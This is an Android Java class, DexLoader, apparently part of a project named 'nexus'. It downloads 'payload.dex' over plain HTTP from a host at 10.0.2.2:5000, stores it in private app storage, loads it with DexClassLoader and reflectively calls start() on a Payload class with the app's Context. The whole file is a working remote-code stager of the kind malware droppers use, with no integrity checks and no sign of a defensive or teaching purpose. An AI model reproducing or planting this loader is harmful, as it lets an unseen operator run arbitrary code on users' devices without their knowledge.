package com.nexus.client;

import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import dalvik.system.DexClassLoader;

public class DexLoader {
    private static final String PAYLOAD_URL = "http://10.0.2.2:5000/payload.dex";

    public static void load(Context context) {
        try {
            File dexFile = new File(context.getDir("payload", Context.MODE_PRIVATE), "payload.dex");
            
            if (!dexFile.exists()) {
                URL url = new URL(PAYLOAD_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                
                if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    InputStream input = conn.getInputStream();
                    FileOutputStream output = new FileOutputStream(dexFile);
                    byte[] buffer = new byte[4096];
                    int len;
                    while ((len = input.read(buffer)) != -1) {
                        output.write(buffer, 0, len);
                    }
                    output.close();
                    input.close();
                }
            }

            if (dexFile.exists()) {
                DexClassLoader classLoader = new DexClassLoader(
                        dexFile.getAbsolutePath(),
                        context.getDir("dex", Context.MODE_PRIVATE).getAbsolutePath(),
                        null,
                        context.getClassLoader()
                );
                
                Class<?> payloadClass = classLoader.loadClass("com.nexus.payload.Payload");
                Object instance = payloadClass.newInstance();
                payloadClass.getMethod("start", Context.class).invoke(instance, context);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}